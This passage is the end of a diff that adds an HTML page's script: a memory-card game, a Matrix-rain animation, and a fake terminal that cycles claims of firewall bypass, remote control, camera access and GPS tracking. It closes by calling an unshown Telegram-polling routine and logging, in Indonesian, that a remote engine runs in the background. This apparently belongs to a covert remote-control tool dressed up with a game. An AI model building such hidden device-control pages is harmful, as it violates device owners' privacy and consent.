+                        matchedPairs++;
+                        flippedCards = [];
+                        if (matchedPairs === 6) {
+                            document.getElementById('memory-status').innerText = 'SELAMAT! Semua Pasangan Cocok! 🎉';
+                        }
+                    } else {
+                        setTimeout(() => {
+                            flippedCards[0].innerText = '';
+                            flippedCards[0].classList.remove('flipped');
+                            flippedCards[1].innerText = '';
+                            flippedCards[1].classList.remove('flipped');
+                            flippedCards = [];
+                        }, 700);
+                    }
+                }
+            };
+            grid.appendChild(card);
+        });
+    }
+
+    // Matrix Rain Effect
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+
+    function resizeMatrix() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    resizeMatrix();
+    window.addEventListener("resize", resizeMatrix);
+
+    const chars = "01XEROMETAGBOTZXABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&";
+    const size = 16;
+    let cols = Math.floor(window.innerWidth / size);
+    let drops = new Array(cols).fill(1);
+
+    function runMatrix() {
+        ctx.fillStyle = "rgba(0,0,0,.08)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#39FF14";
+        ctx.font = size + "px monospace";
+
+        for (let i = 0; i < drops.length; i++) {
+            const char = chars[Math.floor(Math.random() * chars.length)];
+            ctx.fillText(char, i * size, drops[i] * size);
+
+            if (drops[i] * size > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    setInterval(runMatrix, 35);
+
+    // Terminal Xerome Typing Animation
+    const termXerome = document.getElementById("terminal-xerome");
+    const xeromeMessages = [
+        "[+] Establishing Secure Link",
+        "[+] Bypassing Device Firewall",
+        "[+] Loading XEROME Core Session",
+        "[+] Remote Control Access Granted",
+        "[+] Synchronizing Target Hardware",
+        "[+] Hardware Monitoring Enabled",
+        "[+] Camera & Flash Ready",
+        "[+] GPS Tracking Connected",
+        "[+] All Commands Fully Active",
+        "[+] XEROME SYSTEM LOCKED"
+    ];
+
+    let msgIndex = 0;
+    function addXeromeLine(text) {
+        const div = document.createElement("div");
+        termXerome.appendChild(div);
+
+        let i = 0;
+        const writer = setInterval(() => {
+            div.textContent += text.charAt(i);
+            i++;
+            if (i >= text.length) clearInterval(writer);
+        }, 25);
+
+        while (termXerome.children.length > 7) {
+            termXerome.removeChild(termXerome.firstChild);
+        }
+    }
+
+    function loopXeromeMessages() {
+        addXeromeLine(xeromeMessages[msgIndex]);
+        msgIndex++;
+        if (msgIndex >= xeromeMessages.length) msgIndex = 0;
+        setTimeout(loopXeromeMessages, 1200);
+    }
+    loopXeromeMessages();
+
+    let progress = 0;
+    setInterval(() => {
+        progress += 2;
+        if (progress > 100) progress = 0;
+        document.getElementById("bar").style.width = progress + "%";
+    }, 80);
+
+    function updateClock() {
+        const d = new Date();
+        const timeStr = d.toLocaleTimeString();
+        document.querySelectorAll("#clock").forEach(el => el.textContent = timeStr);
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    pollTelegram();
+    logTerminal("Engine XEROME Remote Berjalan di Latar Belakang.");
+</script>
+</body>
+</html>
